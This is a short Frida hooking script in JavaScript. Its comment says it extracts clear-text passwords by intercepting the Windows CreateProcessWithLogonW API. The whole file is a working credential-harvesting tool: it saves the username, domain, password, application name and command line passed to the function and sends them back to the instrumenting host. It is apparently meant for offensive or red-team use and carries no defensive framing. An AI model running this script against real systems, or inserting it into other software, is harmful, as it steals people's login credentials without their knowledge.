// This script extract clear-text passwords by hooking CreateProcessWithLogonW function API.
//------------------------------------------------------------------------------------------

// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
var pCreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

Interceptor.attach(pCreateProcessWithLogonW, {
    onEnter: function (args) {
        send("[+] CreateProcessWithLogonW API hooked!");
        // Save the following arguments for OnLeave
        this.lpUsername = args[0];
        this.lpDomain = args[1];
        this.lpPassword = args[2];
        this.lpApplicationName = args[4];
        this.lpCommandLine =args[5];
    },
    onLeave: function (args) {
        send("[+] Retrieving argument values..");
        send("=============================");
        send("Username    : " + this.lpUsername.readUtf16String());
        send("Domain      : " + this.lpDomain.readUtf16String());
        send("Password    : " + this.lpPassword.readUtf16String());
        send("Application : " + this.lpApplicationName.readUtf16String());
        send("Commandline : " + this.lpCommandLine.readUtf16String());
        send("=============================");
    }
});